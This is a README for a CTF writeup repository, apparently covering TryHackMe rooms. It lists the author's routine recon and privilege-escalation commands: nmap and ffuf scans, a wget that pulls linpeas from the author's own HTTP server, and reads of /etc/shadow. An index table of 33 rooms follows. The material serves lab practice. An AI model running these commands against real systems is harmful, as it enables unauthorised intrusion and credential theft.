- In my CTF challenges writeups, I often skip how to nmap scan, how directory brute forcing, how to get linpeas file, etc
- For that, I always use the same methods.

- First, I use zsh in my ubuntu machine and terminator (which can easily split screens, `Ctrl+Shift+o` for horizontal split and `Ctrl+Shift+e` for vertical split)
- After starting the rooms, I first export IP of the room `export IP=10.10.230.23` in `~/.zshrc` files

1. Nmap Scan

```sh
nmap -sC -sV $IP -oN nmap_init.log -vv
```

- if there are few ports found with default port scanning, I use rustcan to scan all ports (rustscan is fast)

```sh
rustscan -a $IP
```

2. Directory Brute Forcing with FFUF

- I first started with common.txt wordlist (I think it is inside Seclist but I move under usr folder)

```sh
ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/common.txt -e php,txt -c -t 128
```

- If nothing found, use `directory-list-2.3-medium.txt` file

3. For sharing file from local machine to victim (room's) machine, I have already created folder `share/exploit`

- Inside that folder, I collect linpeas.sh, pspy, etc
- from local machine, create python server

```sh
python -m http.server 8888
```

- Then from room's shell,

```sh
wget http://$TUN0_IP:8888/linpeas.sh
```

4. For privilege escalation, I first check

```sh
sudo -l
id                # check groups, docker, sudo, lxd, etc
ls -la /home      # check the users with home directories
cat /etc/passwd   # check the users
cat /etc/shadow   # can i read this
cat /etc/crontab  # if there any cron jobs
sudo --version    # to check sudo bypass
find / -perm -4000 2>/dev/null # for suid bits
```

- if not found, run `linpeas.sh` file

## Challenges

| No  | Title              | Source | Tags                                      | Difficulty | Writeup                                          | Date Finished |
| --- | ------------------ | ------ | ----------------------------------------- | ---------- | ------------------------------------------------ | ------------- |
| 1   | Pickle Rick        | THM    | linux(su),web                             | easy       | [here](./TryHackMe/pickle_rick/readme.md)        | March 2, 2023 |
| 2   | Rootme             | THM    | linux(python),web                         | easy       | [here](./TryHackMe/rootme/readme.md)             | March 2, 2023 |
| 3   | Simple CTF         | THM    | linux(vim),web,crypt                      | easy       | [here](./TryHackMe/simple_ctf/readme.md)         | March 2, 2023 |
| 4   | Vulnversity        | THM    | linux(systemctl),web                      | easy       | [here](./TryHackMe/vulnversity/readme.md)        | March 2, 2023 |
| 5   | Bounty Hacker      | THM    | linux(tar),ftp                            | easy       | [here](./TryHackMe/bountyhacker/readme.md)       | March 2, 2023 |
| 6   | Agent Sudo         | THM    | linux(sudo bypass), web,ftp,crypt,stegano | easy       | [here](./TryHackMe/agentsudo/readme.md)          | March 2, 2023 |
| 7   | Overpass           | THM    | linux(writable hosts),web,crypt           | easy       | [here](./TryHackMe/overpass/readme.md)           | March 2, 2023 |
| 8   | Lazy Admin         | THM    | linux(sudo chain),web                     | easy       | [here](./TryHackMe/lazyadmin/readme.md)          | March 3, 2023 |
| 9   | Skynet             | THM    | linux(tar star files),web,smb             | easy       | [here](./TryHackMe/skynet/readme.md)             | March 3, 2023 |
| 10  | Startup            | THM    | linux(cron),web,ftp                       | easy       | [here](./TryHackMe/startup/readme.md)            | March 3, 2023 |
| 11  | TomGhost           | THM    | linux(zip),web,crypt(gpg)                 | easy       | [here](./TryHackMe/tomghost/readme.md)           | March 4, 2023 |
| 12  | Ignite             | THM    | linux,web                                 | easy       | [here](./TryHackMe/ignite/readme.md)             | March 4, 2023 |
| 13  | Brooklyn99         | THM    | linux(less),web,ftp                       | easy       | [here](./TryHackMe/brooklyn99/readme.md)         | March 4, 2023 |
| 14  | Cyborg             | THM    | linux(cron),web,borg,crypt                | easy       | [here](./TryHackMe/cyborg/readme.md)             | March 4, 2023 |
| 15  | Wgel               | THM    | linux(wget),web,ssh                       | easy       | [here](./TryHackMe/wgel/readme.md)               | March 4, 2023 |
| 16  | LianYu             | THM    | linux(pkexec),web,crypt,stegano           | easy       | [here](./TryHackMe/lian_yu/readme.md)            | March 5, 2023 |
| 17  | Year Of The Rabbit | THM    | linux(sudo bypass), web,crypt,stegano     | easy       | [here](./TryHackMe/year_of_the_rabbit/readme.md) | March 5, 2023 |
| 18  | BruteIt            | THM    | linux(cat),web                            | easy       | [here](./TryHackMe/bruteit/readme.md)            | March 6, 2023 |
| 19  | Chill Hack         | THM    | linux(docker),web,crypt                   | easy       | [here](./TryHackMe/chill_hack/readme.md)         | March 6, 2023 |
| 20  | Cmess              | THM    | linux(cron,tar),web                       | medium     | [here](./TryHackMe/cmess/readme.md)              | March 6, 2023 |
| 21  | Gaming Server      | THM    | linux(lxd),web,ssh                        | easy       | [here](./TryHackMe/gaming_server/readme.md)      | March 7, 2023 |
| 22  | Chocolate Factory  | THM    | linux(vi),web,ssh,stegano,crypt           | easy       | [here](./TryHackMe/chocolate_factory/readme.md)  | March 7, 2023 |
| 23  | Easy Peasy         | THM    | linux(cron),web,stegano,crypt             | easy       | [here](./TryHackMe/easy_peasy/readme.md)         | March 7, 2023 |
| 24  | GitHappens         | THM    | git                                       | easy       | [here](./TryHackMe/githappens/readme.md)         | March 7, 2023 |
| 25  | ArchAngel          | THM    | linux(cp),web(log poison)                 | easy       | [here](./TryHackMe/archangel/readme.md)          | March 7, 2023 |
| 26  | Fowsniff CTF       | THM    | linux(00-header),pop3,ssh                 | easy       | [here](./TryHackMe/Fowsniff/readme.md)           | March 8, 2023 |
| 27  | Agent T            | THM    | web(User-Agentt, php 8.1.0-dev)           | easy       | [here](./TryHackMe/agentT/readme.md)             | March 8, 2023 |
| 28  | Mustacchio         | THM    | linux(suid),web(xxe),ssh                  | easy       | [here](./TryHackMe/mustacchio/readme.md)         | March 8, 2023 |
| 29  | Corridor           | THM    | web(idor), crypt                          | easy       | [here](./TryHackMe/corridor/readme.md)           | March 8, 2023 |
| 30  | Team               | THM    | linux,web(lfi)                            | easy       | [here](./TryHackMe/team/readme.md)               | March 9, 2023 |
| 31  | Ultra Tech         | THM    | linux(docker),web(cmd inj)                | medium     | [here](./TryHackMe/ultra_tech/readme.md)         | March 9, 2023 |
| 32 | Anonymous | THM | linux(env,lxd),ftp,samba | medium | [here](./TryHackMe/anonymous/readme.md) | March 10, 2023 |
| 33 | Convert My Video | THM | linux,web(cmd inj) | medium | [here](./TryHackMe/convert_my_video/readme.md) | March 10, 2023 |
